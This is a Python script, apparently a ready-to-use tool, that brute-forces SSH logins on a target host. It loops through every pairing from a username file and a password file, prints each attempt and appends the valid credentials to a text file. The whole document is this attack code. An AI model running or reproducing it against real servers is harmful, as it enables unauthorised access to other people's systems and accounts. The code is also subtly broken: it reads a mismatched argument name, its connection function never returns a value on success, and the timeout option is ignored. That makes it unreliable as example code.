#!/usr/bin/python
import paramiko
import socket

def check_connection(targetConnection, usernameConnection, passwordConnection):
    #init
    client = paramiko.SSHClient()
    #add to known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=targetConnection, username=usernameConnection, password=passwordConnection, timeout=2)
    except socket.timeout:
        # Can't access target
        print(f"Host: {targetConnection} is unreachable - is SSH enabled?")
        return False
    except paramiko.AuthenticationException:
        print(f"Invalid credentials for {usernameConnection}:{passwordConnection}")
        return False
    except paramiko.SSHException:
        print("Exception occurred")
        return False
    else:
        #connection established
        print(f"Valid Credentials:\n\tHOSTNAME: {targetConnection}\n\tUSERNAME: {usernameConnection}\n\tPASSSWORD: {passwordConnection}")


if __name__=="__main__":
    
    import argparse
    parser = argparse.ArgumentParser(description="Dictionary Attack for SSH servers")
    parser.add_argument("target", help="Target machine")
    parser.add_argument("-p", "--passwords", help="Password file")
    parser.add_argument("-u", "--username", help="Username file")
    parser.add_argument("-t", "--timeout", help="Timeout in secounds (default 2)", type=int, default=2)
    # parse args
    args = parser.parse_args()
    target = args.target
    password_file = args.passwords
    username_file = args.usernames
    timeout = args.timeout
    # read file(s)
    with open(password_file) as f:
        passwords = f.read().splitlines()
    with open(username_file) as f:
        usernames = f.read().splitlines()
    # attack
    valid_creds = []
    for username in usernames:
        for password in passwords:
            print(f"Trying {username}:{password}..")
            creds = check_connection(target, username, password)
            if creds: 
                # if credentials are avalid, save them
                valid_creds.append(creds)
    # write valid crednentials to file
    with open("ValidCreds.txt", "a") as f:
        for username, password in valid_creds:
            f.write(f"Username: {username}@{target}\nPassword: {password}\n\n")